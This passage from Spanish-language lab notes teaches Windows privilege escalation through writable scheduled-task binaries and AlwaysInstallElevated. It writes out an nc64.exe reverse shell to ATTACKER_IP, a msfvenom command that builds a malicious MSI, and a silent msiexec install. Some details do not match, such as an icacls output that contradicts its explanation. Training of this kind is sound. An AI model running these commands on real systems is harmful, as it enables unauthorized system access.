# Other Quick Wins

### Scheduled Tasks

Al examinar las tareas programadas en el sistema de destino, es posible que vea una tarea programada que perdió su binario o que está usando un binario que puede modificar.

Las tareas programadas se pueden enumerar desde la línea de comando usando el `schtasks` comando sin ninguna opción. Para recuperar información detallada sobre cualquiera de los servicios, puede utilizar un comando como el siguiente:

```
C:\> schtasks /query /tn vulntask /fo list /v
```

<figure><img src="../../.gitbook/assets/20231009171859.png" alt=""><figcaption></figcaption></figure>

Obtendrá mucha información sobre la tarea, pero lo que nos importa es el parámetro "Task To Run", que indica qué ejecuta la tarea programada, y el parámetro "Ejecutar como usuario", que muestra el usuario que se utilizará. para ejecutar la tarea.

Si nuestro usuario actual puede modificar o sobrescribir el ejecutable "Tarea a ejecutar", podemos controlar lo que ejecuta el usuario taskusr1, lo que resulta en una simple escalada de privilegios. Para verificar los permisos del archivo en el ejecutable, usamos `icacls`:

```
C:\> icacls c:\tasks\schtask.bat 
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
```

<figure><img src="../../.gitbook/assets/20231009171926.png" alt=""><figcaption></figcaption></figure>

Como se puede ver en el resultado, el grupo **BUILTIN \ Users** tiene acceso completo (F) sobre el binario de la tarea. Esto significa que podemos modificar el archivo .bat e insertar cualquier carga útil que queramos. Para su comodidad, `nc64.exe`puede encontrarlo en `C:\tools`. Cambiemos el archivo bat para generar un shell inverso:

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Luego iniciamos un detector en la máquina atacante en el mismo puerto que indicamos en nuestro shell inverso:

```
C:\> schtasks /run /tn vulntask
```

Y recibirá el shell inverso con privilegios taskusr1 como se esperaba:

<figure><img src="../../.gitbook/assets/20231009172055.png" alt=""><figcaption></figcaption></figure>

Vaya al escritorio taskusr1 para recuperar una bandera. No olvides ingresar la bandera al final de esta tarea.

### Always Install Elevated

Los archivos del instalador de Windows (también conocidos como archivos .msi) se utilizan para instalar aplicaciones en el sistema. Suelen ejecutarse con el nivel de privilegio del usuario que lo inicia. Sin embargo, estos se pueden configurar para ejecutarse con privilegios más altos desde cualquier cuenta de usuario (incluso las que no tienen privilegios). Potencialmente, esto podría permitirnos generar un archivo MSI malicioso que se ejecutaría con privilegios de administrador.

**Nota:** El método AlwaysInstallElevated no funcionará en la máquina de esta sala y se incluye solo como información.

Este método requiere que se establezcan dos valores de registro. Puede consultarlos desde la línea de comando usando los siguientes comandos.

```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Para poder aprovechar esta vulnerabilidad, se deben configurar ambos. De lo contrario, la explotación no será posible. Si están configurados, puede generar un archivo .msi malicioso usando `msfvenom`, como se ve a continuación:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Como se trata de un shell inverso, también debe ejecutar el módulo Metasploit Handler configurado en consecuencia. Una vez que haya transferido el archivo que ha creado, puede ejecutar el instalador con el siguiente comando y recibir el shell inverso:

```shell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
